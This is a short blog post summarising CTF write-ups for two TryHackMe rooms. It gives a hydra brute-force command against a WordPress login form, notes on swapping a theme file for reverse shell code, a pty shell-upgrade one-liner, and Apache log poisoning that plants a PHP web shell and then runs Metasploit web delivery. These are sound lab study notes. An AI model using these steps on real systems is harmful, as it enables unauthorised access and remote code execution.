---
title: Weekly Review 
date: 2023-10-08
categories: [CTF Write Up, THM]
tags: [hydra, interactiveshell, wordpress]
img_path: /assets/mr_robot/
mermaid: true
---
## [Mr Robot](https://cspanias.github.io/posts/Mr-Robot-Write-Up-(2023)/) 

### Dictionary Attack with hydra

1. Login with random creds and check for login error message. 
2. Capture POST request to get its params.
3. Try building a username list by using static pass.
4. If users found, try the reverse. 

 ```shell
 hydra -L <username_list> -p <static_pass> <target-ip> http-post-form "/login_dir:log=^USER^&pwd=^PASS^:F=<error message>" -t 30
 ```
 
 ### RCE on WordPpress 
 
 1. We need admin acc for accessing Appearance --> Editor.
 2. Replance an appropriate PHP script with reverse shell code. 
 
 Interactive terminal
 
 ```shell
 python -c 'import pty;pty.spawn("/bin/bash");'
 ```
 
 ## [Dogcat](https://cspanias.github.io/posts/Dogcat-Write-Up-(2023)/)
 
 ### Log Poisoning
 
 1. NULL Byte usage: `%00` / `&`.
 2. In case we can perform `../` in an Apache web server, we can target its **log file** under `/var/log/apache2/access.log`.
 3. Use the **User-Agent** of the captured request and replace it with code accepting commands:
 ```PHP
 <?php system($_GET['c']); ?>
 ```
 4. Now we can execute commands such as `/access.log&ext&c=<command>`, checking the output in the HTTP response.
 5. Run Metasploit's **web delivery** module, and pass the output as command.
 
 ### Container Escape
 
 1. Check ```hostname```. 
 2. To break out we need to find a way to launch a reverse shell from the current env (Inception concept).